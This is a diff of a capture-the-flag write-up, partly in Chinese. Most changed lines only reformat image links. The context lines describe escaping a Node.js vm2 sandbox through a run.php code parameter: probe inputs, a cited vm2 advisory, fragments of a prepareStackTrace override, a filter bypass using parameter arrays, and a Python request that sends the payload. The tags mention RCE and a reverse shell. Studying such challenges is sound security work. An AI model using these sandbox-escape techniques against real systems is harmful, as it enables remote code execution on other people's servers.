@@ -1,6 +1,6 @@
-![[Pasted image 20230203085920.png|500]]
+![](<./img/Pasted image 20230203085920.png>)
 
-![[Pasted image 20230203090337.png|700]]
+![](<./img/Pasted image 20230203090337.png>)
 
 ```
 /run.php?code=phpinfo();
@@ -10,13 +10,13 @@
 ReferenceError: phpinfo is not defined
 ```
 
-![[Pasted image 20230203090553.png|500]]
+![](<./img/Pasted image 20230203090553.png>)
 
 ```
 /run.php?code=new Error().stack
 ```
 
-![[Pasted image 20230203090731.png|700]]
+![](<./img/Pasted image 20230203090731.png>)
 
 [GHSA-mrgp-mrhc-5jrq](https://github.com/patriksimek/vm2/security/advisories/GHSA-mrgp-mrhc-5jrq)
 
@@ -35,7 +35,7 @@ const {stack} = new globalThis.OldError();
 
 通过替换大法让虚假的`prepareStackTrace`得到执行
 
-![[Pasted image 20230203100235.png|300]]
+![](<./img/Pasted image 20230203100235.png>)
 
 题目存在关键词过滤，通过传递参数数组绕过
 
@@ -57,6 +57,6 @@ const {stack} = new globalThis.OldError();'''
 requests.get(url.format(quote(payload)))
 ```
 
-![[Pasted image 20230203101146.png|500]]
+![](<./img/Pasted image 20230203101146.png>)
 
 #Web #nodejs #js #vm2 #Vulnerabilities #escape #RCE #反弹shell 
